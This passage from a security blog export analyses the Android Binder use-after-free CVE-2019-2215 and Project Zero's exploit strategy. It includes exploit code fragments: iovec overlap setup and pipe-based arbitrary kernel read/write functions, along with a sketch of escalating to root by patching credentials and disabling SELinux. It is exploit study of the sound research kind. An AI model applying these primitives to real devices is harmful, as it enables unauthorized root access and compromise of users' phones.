<code>ep_unregister_pollwait()</code>:</p><pre><code class=\"language-c\">static void ep_unregister_pollwait(struct eventpoll *ep, struct epitem *epi)\n{\n\tstruct list_head *lsthead = &amp;epi-&gt;pwqlist;\n\tstruct eppoll_entry *pwq;\n\n\twhile (!list_empty(lsthead)) {\n\t\tpwq = list_first_entry(lsthead, struct eppoll_entry, llink);\n\n\t\tlist_del(&amp;pwq-&gt;llink);\n\t\tep_remove_wait_queue(pwq);\n\t\tkmem_cache_free(pwq_cache, pwq);\n\t}\n}\n</code></pre><p>We'll notice our free'd <code>binder_thread</code> is in <code>epoll_entry</code>'s linked list, and eventually will be what <code>pwq</code> is.</p><pre><code class=\"language-c\">static void ep_remove_wait_queue(struct eppoll_entry *pwq)\n{\n\twait_queue_head_t *whead;\n\n\trcu_read_lock();\n\t/*\n\t * If it is cleared by POLLFREE, it should be rcu-safe.\n\t * If we read NULL we need a barrier paired with\n\t * smp_store_release() in ep_poll_callback(), otherwise\n\t * we rely on whead-&gt;lock.\n\t */\n\twhead = smp_load_acquire(&amp;pwq-&gt;whead);\n\tif (whead)\n\t\tremove_wait_queue(whead, &amp;pwq-&gt;wait);\n\trcu_read_unlock();\n}\n</code></pre><p>We can see that <code>pwq</code> is used in two places. One is the head of the linked list for the wait queues, <code>whead</code>. The other is the wait queue object itself being deleted via <code>remove_wait_queue</code>.</p><p>At first glance it seems both arguments to <code>remove_wait_queue</code> should be relatively close in memory, but the <code>smp_load_acquire()</code> macro needs to be considered. This macro is a memory barrier. Initially I assumed this macro just added some compiler stuff for atomic access to <code>whead</code>, but this was a mistake. What's not entirely obvious is <code>smp_load_acquire()</code> macro dereferences what's passed to it. So what I originally read as <code>whead = &amp;pwq-&gt;whead</code> is actually more like <code>whead = *(wait_queue_head_t *)&amp;pwq-&gt;whead</code>, or more simply, <code>whead = pwq-&gt;whead</code>.</p><p>Let's look at <code>remove_wait_queue()</code>.</p><pre><code class=\"language-c\">// WRITE-UP COMMENT: q points into stale data / the UAF object\nvoid remove_wait_queue(wait_queue_head_t *q, wait_queue_t *wait)\n{\n\tunsigned long flags;\n\n\tspin_lock_irqsave(&amp;q-&gt;lock, flags);\n\t__remove_wait_queue(q, wait);\n\tspin_unlock_irqrestore(&amp;q-&gt;lock, flags);\n}\n</code></pre><p>When the head of the linked list ends up being our UAF'd <code>binder_thread</code>, <code>q</code> points to stale data. This is why a KASAN crash occurs on the spinlock - it will attempt to lock the mutex on <code>q</code>, which is free'd memory.</p><p>On normal devices not using KASAN instrumentation, if you run the Proof-of-Concept (PoC) as-is you likely won't notice anything. It's highly likely that no crash will occur, which may lead you to (incorrectly) assume the device is not vulnerable. This is because it is very likely <code>q</code> still points to valid, stale heap data. However, if you perform a heap spray of <code>0x41</code>'s, you will trigger a CPU stall, which will cause your device to freeze.</p><p>This is because a lock is essentially just an integer that's set to either 0 (for unlocked) or 1 (for locked). Technically, if the mutex is set to any value that's not zero, it's considered locked. Because an attacker-controlled heap spray will essentially lock the mutex without going through proper channels, this mutex will be permanently locked, which will cause a deadlock and freeze the device.</p><p>It's worth noting this object resides in the <code>kmalloc-512</code> cache, which is a pretty decent cache for exploitation because it's not used a lot by background processes compared to smaller caches. On kernel v4.4.177, the object is <code>0x190</code> or 400 bytes in size. Because of this size being so far from both <code>kmalloc-256</code> and <code>kmalloc-512</code> - it's a fair assumption that this object ends up in the <code>kmalloc-512</code> cache on most if not all devices.</p><h2 id=\"leaking-the-kernel-task-struct\">Leaking the kernel task struct</h2><h3 id=\"weaponizing-an-unlink\">Weaponizing an unlink</h3><p>The way this vulnerability was exploited was quite clever. The exploit takes advantage of a linked list unlink operation. This can be used on an overlapped object to corrupt it using the linked list meta-data.</p><p>Assuming the spinlock doesn't deadlock on an invalid mutex due to memory corruption, eventually the next <code>ep_remove_wait_queue()</code>'s <code>&amp;pwq-&gt;wait</code> reference will point into our UAF'd object. Consider what <code>remove_wait_queue()</code>, and inevitably, <code>__remove_wait_queue()</code>, does on this structure:</p><pre><code class=\"language-c\">// WRITEUP COMMENT: old points to stale data / the UAF object\nstatic inline void\n__remove_wait_queue(wait_queue_head_t *head, wait_queue_t *old)\n{\n\tlist_del(&amp;old-&gt;task_list);\n}\n// ...\nstatic inline void list_del(struct list_head *entry)\n{\n\t__list_del(entry-&gt;prev, entry-&gt;next);\n\tentry-&gt;next = LIST_POISON1;\n\tentry-&gt;prev = LIST_POISON2;\n}\n// ...\nstatic inline void __list_del(struct list_head * prev, struct list_head * next)\n{\n\tnext-&gt;prev = prev;\n\tWRITE_ONCE(prev-&gt;next, next);\n}\n</code></pre><p>The main line of importance here is <code>next-&gt;prev = prev</code>, This essentially is an unlink, and writes into our UAF'd object a pointer of the previous object.</p><p>This is useful because if we overlap another kernel object on top of our UAF'd object, we can weaponize this unlink to corrupt data in the overlapped object. This is used by p0 to leak kernel data. Which object is a good candidate for this attack strategy? Enter <code>iovec</code>.</p><p>There are a few properties of the<code>iovec</code> structure that makes it a really good candidate for exploitation here.</p><ol><li>They're small (0x10 in size on 64-bit machines) and you can control all the fields with very few restrictions</li><li>You can stack them and thus control which kmalloc cache your <code>iovec</code> stack ends up in by how many you write with</li><li>They have a pointer (<code>iov_base</code>) which will be a perfect field to corrupt with the unlink.</li></ol><p>Under normal circumstances, <code>iov_base</code> is checked in the kernel anywhere it's used. The kernel will first ensure that <code>iov_base</code> is a userland pointer before processing the request, however using the unlink primitive we just talked about, we can corrupt this pointer post-validation and overwrite it with a kernel pointer, being the <code>prev</code> object in the unlink process.</p><p>This means when we read from a descriptor that was written to with the corrupted <code>iovec</code>, we'll be reading data originating from a kernel pointer, <em>not</em> a userland one like it's intended. This will allow us to leak kernel data relative to the <code>prev</code> pointer, which contains pointers useful enough to allow for arbitrary read/write as well as code execution.</p><p>The tricky step of this process is figuring out which <code>iovec</code>'s index lines up with the waitqueue. This is important because if we don't fake the mutex properly, the device will hang and we won't be able to have any fun on it.</p><p>Finding the offset of the waitqueue is fairly easy if you have a kernel image of the version you're targeting. By looking at a function that uses the waitqueue field of <code>binder_thread</code>, we can easily find the offset in the disassembly. One such function is <code>binder_wakeup_thread_ilocked()</code>. It calls <code>wake_up_interruptible_sync(&amp;thread-&gt;wait)</code>. The offset should be referenced when the address is loaded into the X0 register just before the call.</p><pre><code class=\"language-assembly\">.text:0000000000C0E2B4    ADD    X0, X8, #0xA0\n.text:0000000000C0E2B8    MOV    W1, #1\n.text:0000000000C0E2BC    MOV    W2, #1\n.text:0000000000C0E2C0    TBZ    W19, #0, loc_C0E2CC\n.text:0000000000C0E2C4    BL     __wake_up_sync\n</code></pre><p>On kernel v4.4.177, we can see the wait queue is <code>0xA0</code> bytes into the <code>binder_thread</code> object. Since <code>iovec</code> is 0x10 in size, this means the <code>iovec</code> at index <code>0xA</code> in the array will line up with the wait queue.</p><pre><code class=\"language-c\">#define BINDER_THREAD_SZ 0x190\n#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16)\n#define WAITQUEUE_OFFSET 0xA0\n#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16)\n</code></pre><p>So how does one pass a valid <code>iov_base</code> address which will pass validation while also keeping the lock at 0 to prevent a deadlock? Since the lock is only a DWORD (4 bytes), and a 64-bit pointer can be passed, you just need to use <code>mmap()</code> to map a userland address where the lower 32-bits are 0.</p><pre><code class=\"language-c\">dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n// ...\n\nstruct iovec iovec_array[IOVEC_ARRAY_SZ];\nmemset(iovec_array, 0, sizeof(iovec_array));\n\niovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */\niovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq-&gt;task_list-&gt;next */\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq-&gt;task_list-&gt;prev */\niovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;\n</code></pre><p>When the exploit runs, the <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> will take the place of the mutex, as well as the <code>next</code> pointer in the linked list. The <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> will take the place of the <code>prev</code> pointer in the linked list. This means <code>IOVEC_INDX_FOR_WQ + 1</code>'s <code>iov_base</code> field is the one that will be overwritten with a kernel pointer.</p><p>Let's take a look at the free'd memory in KGDB on a VM running Android-x86 before and after the unlink operation. To do this, I set a breakpoint on the call to <code>remove_wait_queue()</code>. The first argument will point to the free'd memory, so we'll find the pointer in the RDI register. If we examine this memory before the call, we'll see the following:</p><pre><code class=\"language-text\">Thread 1 hit Breakpoint 11, 0xffffffff812811c2 in ep_unregister_pollwait.isra ()\ngdb-peda$ x/50wx $rdi\n0xffff8880959d68a0:     0x00000000      0x00000001      0x00001000      0x00000000\n0xffff8880959d68b0:     0xdeadbeef      0x00000000      0x00001000      0x00000000\n...\n</code></pre><p>Notice the data overlaps with some <code>iovec</code> structures from above - for example we can see 0xdeadbeef at <code>0xffff88809239a6b0</code>.

The attack strategy is basically as follows:</p><ol><li>Create a pipe</li><li>Trigger the free() on the <code>binder_thread</code> object so that the <code>iovec</code> structures allocated in the next step overlap it</li><li>Write the <code>iovec</code> structures into <code>binder_thread</code>'s old memory via the <code>writev()</code> system call on the pipe</li><li>Trigger the use-after-free / unlink to corrupt the <code>iovec</code> structure</li><li>Call <code>read()</code> on the pipe, which will use the uncorrupted <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ</code> to read the <code>dummy_page</code> data.</li><li>Call <code>read()</code> on the pipe again, which will use the corrupted <code>iovec</code> at <code>IOVEC_INDX_FOR_WQ + 1</code> to read kernel data into the leak buffer.</li></ol><p>Because we initialized two <code>iovec</code>'s with an <code>iov_len</code> of 0x1000, ultimately the <code>writev()</code> call will write two pages of data.

The second page will contain kernel data!</p><p>It's easier to handle the reads and writes in two separate threads.

By simply writing the data we want to write to a pipe with <code>write()</code>, and calling <code>read()</code> on the other end of the pipe with a kernel address, we can pipe data to an arbitrary kernel address.</p><p>Conversely, by writing data from an arbitrary kernel address to a pipe, and calling <code>read()</code> on the other end of the pipe, we can pipe data from an arbitrary kernel address. Boom, arbitrary read/write!</p><pre><code class=\"language-c\">int kernel_rw_pipe[2];\n\n//...\n\nif(pipe(kernel_rw_pipe))\n    exitWithError(\"Kernel R/W Pipe failed: %s\", strerror(errno));\n\n//...\n\nvoid kernel_write(unsigned long kaddr, void *data, size_t len)\n{\n    if(len &gt; 0x1000)\n        exitWithError(\"Reads/writes over the size of a page results causes issues.\");\n    \n    if(write(kernel_rw_pipe[1], data, len) != len)\n        exitWithError(\"Failed to write data to kernel (write)!\");\n    \n    if(read(kernel_rw_pipe[0], (void *)kaddr, len) != len)\n        exitWithError(\"Failed to write data to kernel (read)!\");\n}\n\nvoid kernel_read(unsigned long kaddr, void *data, size_t len)\n{\n    if(len &gt; 0x1000)\n        exitWithError(\"Reads/writes over the size of a page results causes issues.\");\n    \n    if(write(kernel_rw_pipe[1], (void *)kaddr, len) != len)\n        exitWithError(\"Failed to read data from kernel (write)!\");\n    \n    if(read(kernel_rw_pipe[0], data, len) != len)\n        exitWithError(\"Failed to read data from kernel (read)!\");\n}\n</code></pre><h2 id=\"additional-notes\">Additional Notes</h2><p>Some devices (even if they're vulnerable) may fail on the <code>writev()</code> in the leak call, as it'll return 0x1000 instead of the desired 0x2000. This is usually because the offset for the waitqueue is incorrect, therefore the second <code>iovec.iov_base</code> isn't getting smashed with a kernel pointer. This will cause the call to return 0x1000 because the second request will fail, since <code>0xdeadbeef</code> is an unmapped address.</p><p>In this case, you'll have to extract the kernel image for the version you're targeting and pull the proper offsets (or potentially bruteforce it).</p><h2 id=\"conclusion\">Conclusion</h2><p>Once you have kernel read/write, it's basically game over. A root shell is a <code>cred</code> patch away. If you're not on a Samsung device, you can take it a step further and disable SELinux and patch the <code>init_task</code> credentials so every new process that launches post-exploit automatically launches with full privileges. On Samsung devices, I do not believe this is possible without extra work due to their Knox mitigation. On most other devices though, these additional patches shouldn't be an issue.</p><p>It's worth noting that p0's exploit is remarkably stable. It very rarely fails, and when it does it's usually just an error, not a kernel panic, so you just need to run the exploit again and you're good to go. This makes it an awesome temporary root method for people with OEM locked bootloaders like me.</p><p>Overall, I thought this exploit strategy by Jann Horn and Maddie Stone was pretty novel, and I definitely learned a lot breaking it down. It gave me a fresh perspective on use-after-free's, demonstrating that you're not totally out of luck if you can't get a useful primitive from the UAF'd object itself.</p><h2 id=\"references-additional-resources\">References / Additional Resources</h2><p><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1942\">Issue 1942: Android; Use-After-Free in Binder driver (Chromium Bug Tracker) </a></p><p><a href=\"https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885\">Project Zero Exploit</a></p><p><a href=\"https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ\">Syzkaller kASAN report</a></p><p><a href=\"https://elixir.bootlin.com/linux/v4.4.177/source\">Bootlin Linux kernel source browser</a></p><h2 id=\"credit\">Credit</h2><p>Jann Horn and Maddie Stone for the exploit code referenced in the write-up.</p>","slug":"analyzing-androids-cve-2019-2215-dev-binder-uaf"}},{"node":{"title":"Episode 16 - A Bit of everything: 0days, Breaches, Lawsuits, Attacking AI, and some insecure","path":"/posts/episode-16-a-bit-of-everything-0days-breaches-lawsuits-attacking-ai-and-some-insecure/","date":"5 November 2019","description":"   ","content":"<figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/xeb7IMo7XMM?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><!--kg-card-begin: markdown--><p>Watch the podcast live every Monday afternoon at 12:00pm PST (3:00pm EST) on Twitch <a href=\"https://twitch.tv/dayzerosec\">(@Dayzerosec)</a></p>\n<p>[<a href=\"https://www.youtube.com/watch?v=xeb7IMo7XMM&amp;t=00h05m23s\">00:05:23</a>] Apple v.
